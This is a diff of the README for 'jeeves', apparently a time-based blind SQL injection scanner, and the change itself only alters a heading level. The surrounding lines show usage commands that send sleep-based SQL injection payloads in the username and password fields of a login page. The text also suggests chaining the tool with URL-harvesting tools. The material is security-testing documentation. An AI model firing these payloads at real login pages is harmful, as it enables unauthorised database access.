@@ -94,7 +94,7 @@ echo "https://example.com/Login.aspx" | jeeves -p 10 -d "user=(select(0)from(sel
 echo "https://example.com/Login.aspx" | jeeves -p 10 -H "Header1: Value1" -d "username=admin&password='+(select*from(select(sleep(5)))a)+'" -p "http://yourproxy:port"
 ```
 
-### Another ways of Usage
+## Another ways of Usage
 
 You are able to use of Jeeves with other tools, such as gau, gauplus, waybackurls, qsreplace and bhedak, mastering his strenght
 
